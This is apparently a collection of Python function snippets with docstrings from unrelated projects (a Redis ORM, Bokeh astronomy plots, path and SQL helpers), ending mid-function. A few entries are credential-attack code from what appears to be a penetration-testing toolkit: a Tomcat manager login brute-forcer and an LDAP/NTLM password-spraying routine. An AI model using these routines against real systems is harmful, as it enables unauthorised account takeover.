            "def compat_convertHashedIndexes(self, fetchAll=True):\n\t\t'''\n\t\t\tcompat_convertHashedIndexes - Reindex fields, used for when you change the propery \"hashIndex\" on one or more fields.\n\n\t\t\tFor each field, this will delete both the hash and unhashed keys to an object, \n\t\t\t  and then save a hashed or unhashed value, depending on that field's value for \"hashIndex\".\n\n\t\t\tFor an IndexedRedisModel class named \"MyModel\", call as \"MyModel.objects.compat_convertHashedIndexes()\"\n\n\t\t\tNOTE: This works one object at a time (regardless of #fetchAll), so that an unhashable object does not trash all data.\n\n\t\t\tThis method is intended to be used while your application is offline,\n\t\t\t  as it doesn't make sense to be changing your model while applications are actively using it.\n\n\t\t\t@param fetchAll <bool>, Default True - If True, all objects will be fetched first, then converted.\n\t\t\t  This is generally what you want to do, as it is more efficient. If you are memory contrainted,\n\t\t\t  you can set this to \"False\", and it will fetch one object at a time, convert it, and save it back.\n\n\t\t'''\n\n\t\tsaver = IndexedRedisSave(self.mdl)\n\n\t\tif fetchAll is True:\n\t\t\tobjs = self.all()\n\t\t\tsaver.compat_convertHashedIndexes(objs)\n\t\telse:\n\t\t\tdidWarnOnce = False\n\n\t\t\tpks = self.getPrimaryKeys()\n\t\t\tfor pk in pks:\n\t\t\t\tobj = self.get(pk)\n\t\t\t\tif not obj:\n\t\t\t\t\tif didWarnOnce is False:\n\t\t\t\t\t\tsys.stderr.write('WARNING(once)! An object (type=%s , pk=%d) disappered while '  \\\n\t\t\t\t\t\t\t'running compat_convertHashedIndexes! This probably means an application '  \\\n\t\t\t\t\t\t\t'is using the model while converting indexes. This is a very BAD IDEA (tm).')\n\t\t\t\t\t\t\n\t\t\t\t\t\tdidWarnOnce = True\n\t\t\t\t\tcontinue\n\t\t\t\tsaver.compat_convertHashedIndexes([obj])"
        ],
        [
            "def _doSave(self, obj, isInsert, conn, pipeline=None):\n\t\t'''\n\t\t\t_doSave - Internal function to save a single object. Don't call this directly. \n\t\t\t            Use \"save\" instead.\n\n\t\t\t  If a pipeline is provided, the operations (setting values, updating indexes, etc)\n\t\t\t    will be queued into that pipeline.\n\t\t\t  Otherwise, everything will be executed right away.\n\n\t\t\t  @param obj - Object to save\n\t\t\t  @param isInsert - Bool, if insert or update. Either way, obj._id is expected to be set.\n\t\t\t  @param conn - Redis connection\n\t\t\t  @param pipeline - Optional pipeline, if present the items will be queued onto it. Otherwise, go directly to conn.\n\t\t'''\n\n\t\tif pipeline is None:\n\t\t\tpipeline = conn\n\n\t\tnewDict = obj.asDict(forStorage=True)\n\t\tkey = self._get_key_for_id(obj._id)\n\n\t\tif isInsert is True:\n\t\t\tfor thisField in self.fields:\n\n\t\t\t\tfieldValue = newDict.get(thisField, thisField.getDefaultValue())\n\n\t\t\t\tpipeline.hset(key, thisField, fieldValue)\n\n\t\t\t\t# Update origData with the new data\n\t\t\t\tif fieldValue == IR_NULL_STR:\n\t\t\t\t\tobj._origData[thisField] = irNull\n\t\t\t\telse:\n\t\t\t\t\tobj._origData[thisField] = object.__getattribute__(obj, str(thisField))\n\n\t\t\tself._add_id_to_keys(obj._id, pipeline)\n\n\t\t\tfor indexedField in self.indexedFields:\n\t\t\t\tself._add_id_to_index(indexedField, obj._id, obj._origData[indexedField], pipeline)\n\t\telse:\n\t\t\tupdatedFields = obj.getUpdatedFields()\n\t\t\tfor thisField, fieldValue in updatedFields.items():\n\t\t\t\t(oldValue, newValue) = fieldValue\n\n\t\t\t\toldValueForStorage = thisField.toStorage(oldValue)\n\t\t\t\tnewValueForStorage = thisField.toStorage(newValue)\n\n\t\t\t\tpipeline.hset(key, thisField, newValueForStorage)\n\n\t\t\t\tif thisField in self.indexedFields:\n\t\t\t\t\tself._rem_id_from_index(thisField, obj._id, oldValueForStorage, pipeline)\n\t\t\t\t\tself._add_id_to_index(thisField, obj._id, newValueForStorage, pipeline)\n\n\t\t\t\t# Update origData with the new data\n\t\t\t\tobj._origData[thisField] = newValue"
        ],
        [
            "def compat_convertHashedIndexes(self, objs, conn=None):\n\t\t'''\n\t\t\tcompat_convertHashedIndexes - Reindex all fields for the provided objects, where the field value is hashed or not.\n\t\t\tIf the field is unhashable, do not allow.\n\n\t\t\tNOTE: This works one object at a time. It is intended to be used while your application is offline,\n\t\t\t  as it doesn't make sense to be changing your model while applications are actively using it.\n\n\t\t\t@param objs <IndexedRedisModel objects to convert>\n\t\t\t@param conn <redis.Redis or None> - Specific Redis connection or None to reuse.\n\t\t'''\n\t\tif conn is None:\n\t\t\tconn = self._get_connection()\n\n\n\n\t\t# Do one pipeline per object.\n\t\t#  XXX: Maybe we should do the whole thing in one pipeline? \n\n\t\tfields = []        # A list of the indexed fields\n\n\t\t# Iterate now so we do this once instead of per-object.\n\t\tfor indexedField in self.indexedFields:\n\n\t\t\torigField = self.fields[indexedField]\n\n\t\t\t# Check if type supports configurable hashIndex, and if not skip it.\n\t\t\tif 'hashIndex' not in origField.__class__.__new__.__code__.co_varnames:\n\t\t\t\tcontinue\n\n\t\t\tif indexedField.hashIndex is True:\n\t\t\t\thashingField = origField\n\n\t\t\t\tregField = origField.copy()\n\t\t\t\tregField.hashIndex = False\n\t\t\telse:\n\t\t\t\tregField = origField\n\t\t\t\t# Maybe copy should allow a dict of override params?\n\t\t\t\thashingField = origField.copy()\n\t\t\t\thashingField.hashIndex = True\n\n\n\t\t\tfields.append ( (origField, regField, hashingField) )\n\n\t\tobjDicts = [obj.asDict(True, forStorage=True) for obj in objs]\n\n\t\t# Iterate over all values. Remove the possibly stringed index, the possibly hashed index, and then put forth the hashed index.\n\n\t\tfor objDict in objDicts:\n\t\t\tpipeline = conn.pipeline()\n\t\t\tpk = objDict['_id']\n\t\t\tfor origField, regField, hashingField in fields:\n\t\t\t\tval = objDict[indexedField]\n\n\t\t\t\t# Remove the possibly stringed index\n\t\t\t\tself._rem_id_from_index(regField, pk, val, pipeline)\n\t\t\t\t# Remove the possibly hashed index\n\t\t\t\tself._rem_id_from_index(hashingField, pk, val, pipeline)\n\t\t\t\t# Add the new (hashed or unhashed) form.\n\t\t\t\tself._add_id_to_index(origField, pk, val, pipeline)\n\n\t\t\t# Launch all at once\n\t\t\tpipeline.execute()"
        ],
        [
            "def deleteOne(self, obj, conn=None):\n\t\t'''\n\t\t\tdeleteOne - Delete one object\n\n\t\t\t@param obj - object to delete\n\t\t\t@param conn - Connection to reuse, or None\n\n\t\t\t@return - number of items deleted (0 or 1)\n\t\t'''\n\t\tif not getattr(obj, '_id', None):\n\t\t\treturn 0\n\n\t\tif conn is None:\n\t\t\tconn = self._get_connection()\n\t\t\tpipeline = conn.pipeline()\n\t\t\texecuteAfter = True\n\t\telse:\n\t\t\tpipeline = conn # In this case, we are inheriting a pipeline\n\t\t\texecuteAfter = False\n\t\t\n\t\tpipeline.delete(self._get_key_for_id(obj._id))\n\t\tself._rem_id_from_keys(obj._id, pipeline)\n\t\tfor indexedFieldName in self.indexedFields:\n\t\t\tself._rem_id_from_index(indexedFieldName, obj._id, obj._origData[indexedFieldName], pipeline)\n\n\t\tobj._id = None\n\n\t\tif executeAfter is True:\n\t\t\tpipeline.execute()\n\n\t\treturn 1"
        ],
        [
            "def deleteByPk(self, pk):\n\t\t'''\n\t\t\tdeleteByPk - Delete object associated with given primary key\n\t\t'''\n\t\tobj = self.mdl.objects.getOnlyIndexedFields(pk)\n\t\tif not obj:\n\t\t\treturn 0\n\t\treturn self.deleteOne(obj)"
        ],
        [
            "def deleteMultiple(self, objs):\n\t\t'''\n\t\t\tdeleteMultiple - Delete multiple objects\n\n\t\t\t@param objs - List of objects\n\n\t\t\t@return - Number of objects deleted\n\t\t'''\n\t\tconn = self._get_connection()\n\t\tpipeline = conn.pipeline()\n\n\t\tnumDeleted = 0\n\n\t\tfor obj in objs:\n\t\t\tnumDeleted += self.deleteOne(obj, pipeline)\n\n\t\tpipeline.execute()\n\n\t\treturn numDeleted"
        ],
        [
            "def deleteMultipleByPks(self, pks):\n\t\t'''\n\t\t\tdeleteMultipleByPks - Delete multiple objects given their primary keys\n\n\t\t\t@param pks - List of primary keys\n\n\t\t\t@return - Number of objects deleted\n\t\t'''\n\t\tif type(pks) == set:\n\t\t\tpks = list(pks)\n\n\t\tif len(pks) == 1:\n\t\t\treturn self.deleteByPk(pks[0])\n\n\t\tobjs = self.mdl.objects.getMultipleOnlyIndexedFields(pks)\n\t\treturn self.deleteMultiple(objs)"
        ],
        [
            "def string(html, start_on=None, ignore=(), use_short=True, **queries):\n    '''Returns a blox template from an html string'''\n    if use_short:\n        html = grow_short(html)\n    return _to_template(fromstring(html), start_on=start_on,\n                        ignore=ignore, **queries)"
        ],
        [
            "def file(file_object, start_on=None, ignore=(), use_short=True, **queries):\n    '''Returns a blox template from a file stream object'''\n    return string(file_object.read(), start_on=start_on, ignore=ignore, use_short=use_short, **queries)"
        ],
        [
            "def filename(file_name, start_on=None, ignore=(), use_short=True, **queries):\n    '''Returns a blox template from a valid file path'''\n    with open(file_name) as template_file:\n        return file(template_file, start_on=start_on, ignore=ignore, use_short=use_short, **queries)"
        ],
        [
            "def keywords(func):\n    \"\"\"\n    Accumulate all dictionary and named arguments as\n    keyword argument dictionary. This is generally useful for\n    functions that try to automatically resolve inputs.\n\n    Examples:\n        >>> @keywords\n        >>> def test(*args, **kwargs):\n        >>>     return kwargs\n        >>>\n        >>> print test({'one': 1}, two=2)\n        {'one': 1, 'two': 2}\n    \"\"\"\n    @wraps(func)\n    def decorator(*args, **kwargs):\n        idx = 0 if inspect.ismethod(func) else 1\n        if len(args) > idx:\n            if isinstance(args[idx], (dict, composite)):\n                for key in args[idx]:\n                    kwargs[key] = args[idx][key]\n                args = args[:idx]\n        return func(*args, **kwargs)\n    return decorator"
        ],
        [
            "def getCompressMod(self):\n\t\t'''\n\t\t\tgetCompressMod - Return the module used for compression on this field\n\n\t\t\t@return <module> - The module for compression\n\t\t'''\n\t\tif self.compressMode == COMPRESS_MODE_ZLIB:\n\t\t\treturn zlib\n\t\tif self.compressMode == COMPRESS_MODE_BZ2:\n\t\t\treturn bz2\n\t\tif self.compressMode == COMPRESS_MODE_LZMA:\n\t\t\t# Since lzma is not provided by python core in python2, search out some common alternatives.\n\t\t\t#  Throw exception if we can find no lzma implementation.\n\t\t\tglobal _lzmaMod\n\t\t\tif _lzmaMod is not None:\n\t\t\t\treturn _lzmaMod\n\t\t\ttry:\n\t\t\t\timport lzma\n\t\t\t\t_lzmaMod = lzma\n\t\t\t\treturn _lzmaMod\n\t\t\texcept:\n\t\t\t\t# Python2 does not provide \"lzma\" module, search for common alternatives\n\t\t\t\ttry:\n\t\t\t\t\tfrom backports import lzma\n\t\t\t\t\t_lzmaMod = lzma\n\t\t\t\t\treturn _lzmaMod\n\t\t\t\texcept:\n\t\t\t\t\tpass\n\t\t\t\ttry:\n\t\t\t\t\timport lzmaffi as lzma\n\t\t\t\t\t_lzmaMod = lzma\n\t\t\t\t\treturn _lzmaMod\n\t\t\t\texcept:\n\t\t\t\t\tpass\n\t\t\t\traise ImportError(\"Requested compress mode is lzma and could not find a module providing lzma support. Tried: 'lzma', 'backports.lzma', 'lzmaffi' and none of these were available. Please install one of these, or to use an unlisted implementation, set IndexedRedis.fields.compressed._lzmaMod to the module (must implement standard python compression interface)\")"
        ],
        [
            "def toBytes(self, value):\n\t\t'''\n\t\t\ttoBytes - Convert a value to bytes using the encoding specified on this field\n\n\t\t\t@param value <str> - The field to convert to bytes\n\n\t\t\t@return <bytes> - The object encoded using the codec specified on this field.\n\n\t\t\tNOTE: This method may go away.\n\t\t'''\n\t\tif type(value) == bytes:\n\t\t\treturn value\n\t\treturn value.encode(self.getEncoding())"
        ],
        [
            "def keep_kwargs_partial(func, *args, **keywords):\n    \"\"\"Like functools.partial but instead of using the new kwargs, keeps the old ones.\"\"\"\n    def newfunc(*fargs, **fkeywords):\n        newkeywords = fkeywords.copy()\n        newkeywords.update(keywords)\n        return func(*(args + fargs), **newkeywords)\n    newfunc.func = func\n    newfunc.args = args\n    newfunc.keywords = keywords\n    return newfunc"
        ],
        [
            "def remote_jupyter_proxy_url(port):\n    \"\"\"\n    Callable to configure Bokeh's show method when a proxy must be\n    configured.\n\n    If port is None we're asking about the URL\n    for the origin header.\n    \"\"\"\n    base_url = os.environ['EXTERNAL_URL']\n    host = urllib.parse.urlparse(base_url).netloc\n\n    # If port is None we're asking for the URL origin\n    # so return the public hostname.\n    if port is None:\n        return host\n\n    service_url_path = os.environ['JUPYTERHUB_SERVICE_PREFIX']\n    proxy_url_path = 'proxy/%d' % port\n\n    user_url = urllib.parse.urljoin(base_url, service_url_path)\n    full_url = urllib.parse.urljoin(user_url, proxy_url_path)\n    return full_url"
        ],
        [
            "def setup_notebook(debug=False):\n    \"\"\"Called at the start of notebook execution to setup the environment.\n\n    This will configure bokeh, and setup the logging library to be\n    reasonable.\"\"\"\n    output_notebook(INLINE, hide_banner=True)\n    if debug:\n        _setup_logging(logging.DEBUG)\n        logging.debug('Running notebook in debug mode.')\n    else:\n        _setup_logging(logging.WARNING)\n\n    # If JUPYTERHUB_SERVICE_PREFIX environment variable isn't set,\n    # this means that you're running JupyterHub not with Hub in k8s,\n    # and not using run_local.sh (which sets it to empty).\n    if 'JUPYTERHUB_SERVICE_PREFIX' not in os.environ:\n        global jupyter_proxy_url\n        jupyter_proxy_url = 'localhost:8888'\n        logging.info('Setting jupyter proxy to local mode.')"
        ],
        [
            "def overview():\n    \"\"\"\n        Creates a overview of the hosts per range.\n    \"\"\"\n    range_search = RangeSearch()\n    ranges = range_search.get_ranges()\n    if ranges:\n        formatted_ranges = []\n        tags_lookup = {}\n        for r in ranges:\n            formatted_ranges.append({'mask': r.range})\n            tags_lookup[r.range] = r.tags\n        search = Host.search()\n        search = search.filter('term', status='up')\n        search.aggs.bucket('hosts', 'ip_range', field='address', ranges=formatted_ranges)\n        response = search.execute()\n        print_line(\"{0:<18} {1:<6} {2}\".format(\"Range\", \"Count\", \"Tags\"))\n        print_line(\"-\" * 60)\n        for entry in response.aggregations.hosts.buckets:\n            print_line(\"{0:<18} {1:<6} {2}\".format(entry.key, entry.doc_count, tags_lookup[entry.key]))\n    else:\n        print_error(\"No ranges defined.\")"
        ],
        [
            "def create_hierarchy(hierarchy, level):\n    \"\"\"Create an OrderedDict\n\n    :param hierarchy: a dictionary\n    :param level: single key\n    :return: deeper dictionary\n    \"\"\"\n    if level not in hierarchy:\n        hierarchy[level] = OrderedDict()\n    return hierarchy[level]"
        ],
        [
            "def line_chunker(text, getreffs, lines=30):\n    \"\"\" Groups line reference together\n\n    :param text: Text object\n    :type text: MyCapytains.resources.text.api\n    :param getreffs: Callback function to retrieve text\n    :type getreffs: function(level)\n    :param lines: Number of lines to use by group\n    :type lines: int\n    :return: List of grouped urn references with their human readable version\n    :rtype: [(str, str)]\n    \"\"\"\n    level = len(text.citation)\n    source_reffs = [reff.split(\":\")[-1] for reff in getreffs(level=level)]\n    reffs = []\n    i = 0\n    while i + lines - 1 < len(source_reffs):\n        reffs.append(tuple([source_reffs[i]+\"-\"+source_reffs[i+lines-1], source_reffs[i]]))\n        i += lines\n    if i < len(source_reffs):\n        reffs.append(tuple([source_reffs[i]+\"-\"+source_reffs[len(source_reffs)-1], source_reffs[i]]))\n    return reffs"
        ],
        [
            "def level_chunker(text, getreffs, level=1):\n    \"\"\" Chunk a text at the passage level\n\n    :param text: Text object\n    :type text: MyCapytains.resources.text.api\n    :param getreffs: Callback function to retrieve text\n    :type getreffs: function(level)\n    :return: List of urn references with their human readable version\n    :rtype: [(str, str)]\n    \"\"\"\n    references = getreffs(level=level)\n    return [(ref.split(\":\")[-1], ref.split(\":\")[-1]) for ref in references]"
        ],
        [
            "def table(cluster):\n    \"\"\"\n    Create a numpy.ndarray with all observed fields and\n    computed teff and luminosity values.\n    \"\"\"\n    teffs = teff(cluster)\n    lums = luminosity(cluster)\n    arr = cluster.to_array()\n    i = 0\n    for row in arr:\n        row['lum'][0] = np.array([lums[i]], dtype='f')\n        row['temp'][0] = np.array([teffs[i]], dtype='f')\n        i += 1\n    arr = round_arr_teff_luminosity(arr)\n    return arr"
        ],
        [
            "def round_arr_teff_luminosity(arr):\n    \"\"\"\n    Return the numpy array with rounded teff and luminosity columns.\n    \"\"\"\n    arr['temp'] = np.around(arr['temp'], -1)\n    arr['lum'] = np.around(arr['lum'], 3)\n    return arr"
        ],
        [
            "def main():\n    \"\"\"\n        Checks the arguments to brutefore and spawns greenlets to perform the bruteforcing.\n    \"\"\"\n    services = ServiceSearch()\n    argparse = services.argparser\n    argparse.add_argument('-f', '--file', type=str, help=\"File\")\n    arguments = argparse.parse_args()\n\n    if not arguments.file:\n        print_error(\"Please provide a file with credentials seperated by ':'\")\n        sys.exit()\n\n    services = services.get_services(search=[\"Tomcat\"], up=True, tags=['!tomcat_brute'])\n\n    credentials = []\n    with open(arguments.file, 'r') as f:\n        credentials = f.readlines()\n\n    for service in services:\n        print_notification(\"Checking ip:{} port {}\".format(service.address, service.port))\n        url = 'http://{}:{}/manager/html'\n        gevent.spawn(brutefore_passwords, service.address, url.format(service.address, service.port), credentials, service)\n        service.add_tag('tomcat_brute')\n        service.update(tags=service.tags)\n\n    gevent.wait()\n    # TODO fix stats\n    Logger().log(\"tomcat_brute\", \"Performed tomcat bruteforce scan\", {'scanned_services': len(services)})"
        ],
        [
            "def skyimage_figure(cluster):\n    \"\"\"\n    Given a cluster create a Bokeh plot figure using the\n    cluster's image.\n    \"\"\"\n    pf_image = figure(x_range=(0, 1), y_range=(0, 1),\n                      title='Image of {0}'.format(cluster.name))\n    pf_image.image_url(url=[cluster.image_path],\n                       x=0, y=0, w=1, h=1, anchor='bottom_left')\n    pf_image.toolbar_location = None\n    pf_image.axis.visible = False\n    return pf_image"
        ],
        [
            "def round_teff_luminosity(cluster):\n    \"\"\"\n    Returns rounded teff and luminosity lists.\n    \"\"\"\n    temps = [round(t, -1) for t in teff(cluster)]\n    lums = [round(l, 3) for l in luminosity(cluster)]\n    return temps, lums"
        ],
        [
            "def hr_diagram_figure(cluster):\n    \"\"\"\n    Given a cluster create a Bokeh plot figure creating an\n    H-R diagram.\n    \"\"\"\n    temps, lums = round_teff_luminosity(cluster)\n    x, y = temps, lums\n    colors, color_mapper = hr_diagram_color_helper(temps)\n    x_range = [max(x) + max(x) * 0.05, min(x) - min(x) * 0.05]\n    source = ColumnDataSource(data=dict(x=x, y=y, color=colors))\n\n    pf = figure(y_axis_type='log', x_range=x_range, name='hr',\n                tools='box_select,lasso_select,reset,hover',\n                title='H-R Diagram for {0}'.format(cluster.name))\n    pf.select(BoxSelectTool).select_every_mousemove = False\n    pf.select(LassoSelectTool).select_every_mousemove = False\n    hover = pf.select(HoverTool)[0]\n    hover.tooltips = [(\"Temperature (Kelvin)\", \"@x{0}\"),\n                      (\"Luminosity (solar units)\", \"@y{0.00}\")]\n    _diagram(source=source, plot_figure=pf, name='hr',\n             color={'field': 'color', 'transform': color_mapper},\n             xaxis_label='Temperature (Kelvin)',\n             yaxis_label='Luminosity (solar units)')\n    return pf"
        ],
        [
            "def calculate_diagram_ranges(data):\n    \"\"\"\n    Given a numpy array calculate what the ranges of the H-R\n    diagram should be.\n    \"\"\"\n    data = round_arr_teff_luminosity(data)\n    temps = data['temp']\n    x_range = [1.05 * np.amax(temps), .95 * np.amin(temps)]\n    lums = data['lum']\n    y_range = [.50 * np.amin(lums), 2 * np.amax(lums)]\n    return (x_range, y_range)"
        ],
        [
            "def hr_diagram_from_data(data, x_range, y_range):\n    \"\"\"\n    Given a numpy array create a Bokeh plot figure creating an\n    H-R diagram.\n    \"\"\"\n    _, color_mapper = hr_diagram_color_helper([])\n    data_dict = {\n        'x': list(data['temperature']),\n        'y': list(data['luminosity']),\n        'color': list(data['color'])\n    }\n    source = ColumnDataSource(data=data_dict)\n    pf = figure(y_axis_type='log', x_range=x_range, y_range=y_range)\n    _diagram(source=source, plot_figure=pf,\n             color={'field': 'color', 'transform': color_mapper},\n             xaxis_label='Temperature (Kelvin)',\n             yaxis_label='Luminosity (solar units)')\n    show_with_bokeh_server(pf)"
        ],
        [
            "def _filter_cluster_data(self):\n        \"\"\"\n        Filter the cluster data catalog into the filtered_data\n        catalog, which is what is shown in the H-R diagram.\n\n        Filter on the values of the sliders, as well as the lasso\n        selection in the skyviewer.\n        \"\"\"\n        min_temp = self.temperature_range_slider.value[0]\n        max_temp = self.temperature_range_slider.value[1]\n        temp_mask = np.logical_and(\n            self.cluster.catalog['temperature'] >= min_temp,\n            self.cluster.catalog['temperature'] <= max_temp\n        )\n\n        min_lum = self.luminosity_range_slider.value[0]\n        max_lum = self.luminosity_range_slider.value[1]\n        lum_mask = np.logical_and(\n            self.cluster.catalog['luminosity'] >= min_lum,\n            self.cluster.catalog['luminosity'] <= max_lum\n        )\n\n        selected_mask = np.isin(self.cluster.catalog['id'], self.selection_ids)\n\n        filter_mask = temp_mask & lum_mask & selected_mask\n        self.filtered_data = self.cluster.catalog[filter_mask].data\n\n        self.source.data = {\n            'id': list(self.filtered_data['id']),\n            'temperature': list(self.filtered_data['temperature']),\n            'luminosity': list(self.filtered_data['luminosity']),\n            'color': list(self.filtered_data['color'])\n        }\n\n        logging.debug(\"Selected data is now: %s\", self.filtered_data)"
        ],
        [
            "def modify_data(data):\n    \"\"\"\n        Creates a tempfile and starts the given editor, returns the data afterwards.\n    \"\"\"\n    with tempfile.NamedTemporaryFile('w') as f:\n        for entry in data:\n            f.write(json.dumps(entry.to_dict(\n                include_meta=True),\n                default=datetime_handler))\n            f.write('\\n')\n        f.flush()\n        print_success(\"Starting editor\")\n        subprocess.call(['nano', '-', f.name])\n        with open(f.name, 'r') as f:\n            return f.readlines()"
        ],
        [
            "def modify_input():\n    \"\"\"\n        This functions gives the user a way to change the data that is given as input.\n    \"\"\"\n    doc_mapper = DocMapper()\n    if doc_mapper.is_pipe:\n        objects = [obj for obj in doc_mapper.get_pipe()]\n        modified = modify_data(objects)\n        for line in modified:\n            obj = doc_mapper.line_to_object(line)\n            obj.save()\n        print_success(\"Object(s) successfully changed\")\n    else:\n        print_error(\"Please use this tool with pipes\")"
        ],
        [
            "def bruteforce(users, domain, password, host):\n    \"\"\"\n        Performs a bruteforce for the given users, password, domain on the given host.\n    \"\"\"\n    cs = CredentialSearch(use_pipe=False)\n\n    print_notification(\"Connecting to {}\".format(host))\n\n    s = Server(host)\n    c = Connection(s)\n\n    for user in users:\n        if c.rebind(user=\"{}\\\\{}\".format(domain, user.username), password=password, authentication=NTLM):\n            print_success('Success for: {}:{}'.format(user.username, password))\n            credential = cs.find_object(\n                user.username, password, domain=domain, host_ip=host)\n            if not credential:\n                credential = Credential(username=user.username, secret=password,\n                                        domain=domain, host_ip=host, type=\"plaintext\", port=389)\n            credential.add_tag(tag)\n            credential.save()\n\n            # Add a tag to the user object, so we dont have to bruteforce it again.\n            user.add_tag(tag)\n            user.save()\n        else:\n            print_error(\"Fail for: {}:{}\".format(user.username, password))"
        ],
        [
            "def utime(self, *args, **kwargs):\n        \"\"\" Set the access and modified times of the file specified by path. \"\"\"\n        os.utime(self.extended_path, *args, **kwargs)"
        ],
        [
            "def _from_parts(cls, args, init=True):\n        \"\"\"\n        Strip \\\\?\\ prefix in init phase\n        \"\"\"\n        if args:\n            args = list(args)\n            if isinstance(args[0], WindowsPath2):\n                args[0] = args[0].path\n            elif args[0].startswith(\"\\\\\\\\?\\\\\"):\n                args[0] = args[0][4:]\n            args = tuple(args)\n        return super(WindowsPath2, cls)._from_parts(args, init)"
        ],
        [
            "def path(self):\n        \"\"\"\n        Return the path always without the \\\\?\\ prefix.\n        \"\"\"\n        path = super(WindowsPath2, self).path\n        if path.startswith(\"\\\\\\\\?\\\\\"):\n            return path[4:]\n        return path"
        ],
        [
            "def format():\n    \"\"\"\n        Formats the output of another tool in the given way.\n        Has default styles for ranges, hosts and services.\n    \"\"\"\n    argparser = argparse.ArgumentParser(description='Formats a json object in a certain way. Use with pipes.')\n    argparser.add_argument('format', metavar='format', help='How to format the json for example \"{address}:{port}\".', nargs='?')\n    arguments = argparser.parse_args()\n    service_style = \"{address:15} {port:7} {protocol:5} {service:15} {state:10} {banner} {tags}\"\n    host_style = \"{address:15} {tags}\"\n    ranges_style = \"{range:18} {tags}\"\n    users_style = \"{username}\"\n    if arguments.format:\n        format_input(arguments.format)\n    else:\n        doc_mapper = DocMapper()\n        if doc_mapper.is_pipe:\n            for obj in doc_mapper.get_pipe():\n                style = ''\n                if isinstance(obj, Range):\n                    style = ranges_style\n                elif isinstance(obj, Host):\n                    style = host_style\n                elif isinstance(obj, Service):\n                    style = service_style\n                elif isinstance(obj, User):\n                    style = users_style\n                print_line(fmt.format(style, **obj.to_dict(include_meta=True)))\n        else:\n            print_error(\"Please use this script with pipes\")"
        ],
        [
            "def print_line(text):\n    \"\"\"\n        Print the given line to stdout\n    \"\"\"\n    try:\n        signal.signal(signal.SIGPIPE, signal.SIG_DFL)\n    except ValueError:\n        pass\n\n    try:\n        sys.stdout.write(text)\n        if not text.endswith('\\n'):\n            sys.stdout.write('\\n')\n        sys.stdout.flush()\n    except IOError:\n        sys.exit(0)"
        ],
        [
            "def get_own_ip():\n    \"\"\"\n        Gets the IP from the inet interfaces.\n    \"\"\"\n    own_ip = None\n    interfaces = psutil.net_if_addrs()\n    for _, details in interfaces.items():\n        for detail in details:\n            if detail.family == socket.AF_INET:\n                ip_address = ipaddress.ip_address(detail.address)\n                if not (ip_address.is_link_local or ip_address.is_loopback):\n                    own_ip = str(ip_address)\n                    break\n    return own_ip"
        ],
        [
            "def pprint(arr, columns=('temperature', 'luminosity'),\n           names=('Temperature (Kelvin)', 'Luminosity (solar units)'),\n           max_rows=32, precision=2):\n    \"\"\"\n    Create a pandas DataFrame from a numpy ndarray.\n\n    By default use temp and lum with max rows of 32 and precision of 2.\n\n    arr - An numpy.ndarray.\n    columns - The columns to include in the pandas DataFrame. Defaults to\n              temperature and luminosity.\n    names - The column names for the pandas DataFrame. Defaults to\n            Temperature and Luminosity.\n    max_rows - If max_rows is an integer then set the pandas\n               display.max_rows option to that value. If max_rows\n               is True then set display.max_rows option  to 1000.\n    precision - An integer to set the pandas precision option.\n    \"\"\"\n    if max_rows is True:\n        pd.set_option('display.max_rows', 1000)\n    elif type(max_rows) is int:\n        pd.set_option('display.max_rows', max_rows)\n    pd.set_option('precision', precision)\n    df = pd.DataFrame(arr.flatten(), index=arr['id'].flatten(),\n                      columns=columns)\n    df.columns = names\n    return df.style.format({names[0]: '{:.0f}',\n                            names[1]: '{:.2f}'})"
        ],
        [
            "def strip_labels(filename):\n    \"\"\"Strips labels.\"\"\"\n    labels = []\n    with open(filename) as f, open('processed_labels.txt', 'w') as f1:\n        for l in f:\n            if l.startswith('#'):\n                next\n            l = l.replace(\" .\", '')\n            l = l.replace(\">\\tskos:prefLabel\\t\", ' ')\n            l = l.replace(\"<\", '')\n            l = l.replace(\">\\trdfs:label\\t\", ' ')\n            f1.write(l)"
        ],
        [
            "def remove_namespace(doc, namespace):\n  '''Remove namespace in the passed document in place.'''\n  ns = u'{%s}' % namespace\n  nsl = len(ns)\n  for elem in doc.getiterator():\n    if elem.tag.startswith(ns):\n      elem.tag = elem.tag[nsl:]\n      elem.attrib['oxmlns'] = namespace"
        ],
        [
            "def match(self, uri):\n        \"\"\" Check to see if this URI is retrievable by this Retriever implementation\n\n        :param uri: the URI of the resource to be retrieved\n        :type uri: str\n        :return: True if it can be, False if not\n        :rtype: bool\n        \"\"\"\n        absolute_uri = self.__absolute__(uri)\n\n        return absolute_uri.startswith(self.__path__) and op.exists(absolute_uri)"
        ],
        [
            "def hook(name):\n  '''\n  Decorator used to tag a method that should be used as a hook for the\n  specified `name` hook type.\n  '''\n  def hookTarget(wrapped):\n    if not hasattr(wrapped, '__hook__'):\n      wrapped.__hook__ = [name]\n    else:\n      wrapped.__hook__.append(name)\n    return wrapped\n  return hookTarget"
        ],
        [
            "def addHook(self, name, callable):\n    '''\n    Subscribes `callable` to listen to events of `name` type. The\n    parameters passed to `callable` are dependent on the specific\n    event being triggered.\n    '''\n    if name not in self._hooks:\n      self._hooks[name] = []\n    self._hooks[name].append(callable)"
        ],
        [
            "def configure(self, argv=None):\n    '''\n    Configures this engine based on the options array passed into\n    `argv`. If `argv` is ``None``, then ``sys.argv`` is used instead.\n    During configuration, the command line options are merged with\n    previously stored values. Then the logging subsystem and the\n    database model are initialized, and all storable settings are\n    serialized to configurations files.\n    '''\n    self._setupOptions()\n    self._parseOptions(argv)\n    self._setupLogging()\n    self._setupModel()\n    self.dbsession.commit()\n    return self"
        ],
        [
            "def _assemble_select(self, sql_str, columns, *args, **kwargs):\n        \"\"\" Alias for _assemble_with_columns\n        \"\"\"\n        warnings.warn(\"_assemble_select has been depreciated for _assemble_with_columns. It will be removed in a future version.\", DeprecationWarning)\n        return self._assemble_with_columns(sql_str, columns, *args, **kwargs)"
        ],
        [
            "def _execute(self, query, commit=False, working_columns=None):\n        \"\"\" \n        Execute a query with provided parameters \n\n        Parameters\n        :query:     SQL string with parameter placeholders\n        :commit:    If True, the query will commit\n        :returns:   List of rows\n        \"\"\"\n\n        log.debug(\"RawlBase._execute()\")\n\n        result = []\n\n        if working_columns is None:\n            working_columns = self.columns\n\n        with RawlConnection(self.dsn) as conn:\n\n            query_id = random.randrange(9999)\n\n            curs = conn.cursor()\n\n            try:\n                log.debug(\"Executing(%s): %s\" % (query_id, query.as_string(curs)))\n            except:\n                log.exception(\"LOGGING EXCEPTION LOL\")\n\n            curs.execute(query)\n\n            log.debug(\"Executed\")\n\n            if commit == True:\n                log.debug(\"COMMIT(%s)\" % query_id)\n                conn.commit()\n            \n            log.debug(\"curs.rowcount: %s\" % curs.rowcount)\n            \n            if 